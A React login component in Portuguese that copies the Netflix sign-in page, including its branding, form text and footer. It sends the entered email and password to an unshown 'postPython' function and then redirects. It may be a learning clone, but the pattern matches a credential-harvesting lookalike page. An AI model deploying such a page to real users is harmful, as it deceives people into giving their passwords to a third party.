import React, { useEffect, useState } from "react";
import './Login.css';
import { useNavigate } from "react-router-dom";
import axios from "axios";
import { postPython } from "./function/index.js";

export default () => {

    const [email, setEmail] = useState('');
    const [senha, setSenha] = useState('');
    const [loading, setLoading] = useState(false);
    const navigate = useNavigate();

    const handleLogin = (event) => {
        event.preventDefault(); // Prevents the default form submission behavior (page refresh)
        if (email !== "" && senha !== "") {
            setLoading(true);
            postPython(email, senha).then((response) => {
                navigate('/Netflix');
                setLoading(false);

            }).catch((err) => {
                setLoading(false);
                console.log(err)
            })
        } else {
            alert('Usuário ou senha devem ser preenchidos corretamente');
        }
    };

    const handleEmailChange = (event) => {
        setEmail(event.target.value);
    };

    const handleSenhaChange = (event) => {
        setSenha(event.target.value);
    };

    return (
        <div className="page">
            {loading &&
                <div className="loading">
                    <img src="https://media.wired.com/photos/592744d3f3e2356fd800bf00/3:2/w_960,c_limit/Netflix_LoadTime.gif" />
                </div>
            }
            <h1 className="name"> NETFLIX </h1>

            <div className="container--center">
                <div className="container">
                    <h1>Entrar </h1>
                    <form onSubmit={handleLogin}>
                        <input className="email" id="email" type="email" placeholder="Email ou número de telefone" onChange={handleEmailChange} />
                        <p className="message" id="message">
                            Informe um email ou número de telefone válido,
                        </p>
                        <br />
                        <input className="password" id="password" type="password" placeholder="Senha" onChange={handleSenhaChange} />
                        <p className="message2" id="message2">
                            A senha deve ter entre 4 e 60 caracteres.
                        </p>
                        <br />

                        <input className="submit" type="submit" value="Entrar" />
                        <br />
                        <input id="check" type="checkbox" />
                        <label for="check">Lembre-se de mim</label>
                        <a className="help" href="#">Precisa de ajuda?</a>

                    </form>
                    <div className="content">
                        <span className="span--login">Novo por aqui ?
                            <a className="subscribe" href="#">
                                Assine agora.
                            </a>
                            <br />
                            <br />
                            <p>
                                Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô.
                                <br /><a className="more" href="#">Saiba mais.</a>
                            </p>
                        </span>
                    </div>
                </div>
            </div>
            <footer className="footer--login">
                <p>Dúvidas? (81) 9 98675029</p>

                <div className="options">
                    <a href="#">Perguntas frequentes</a>
                    <a href="#">Central de Ajuda</a>
                    <a href="#">Termos de Uso</a>
                    <a href="#">Privacidade</a>
                </div>
                <div className="options--two">
                    <a href="#">Preferências de cookies</a>
                    <a className="information" href="#">Informações corporativas</a>
                </div>

                <select className="select--login"> 
                    <option>Português</option>
                    <option>English</option>
                </select>

            </footer>
        </div>
    );
}